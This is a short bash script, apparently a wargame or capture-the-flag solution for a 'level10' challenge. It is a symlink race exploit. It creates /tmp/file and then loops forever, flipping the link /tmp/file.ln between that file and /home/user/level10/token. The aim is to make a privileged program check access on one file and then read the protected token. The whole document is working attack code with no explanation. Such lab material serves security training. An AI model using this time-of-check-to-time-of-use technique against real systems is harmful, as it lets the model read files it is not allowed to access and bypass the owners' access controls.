#!/bin/bash

touch /tmp/file

while true
do
	ln -sf /tmp/file /tmp/file.ln 2>/dev/null
	ln -sf /home/user/level10/token /tmp/file.ln 2>/dev/null
done
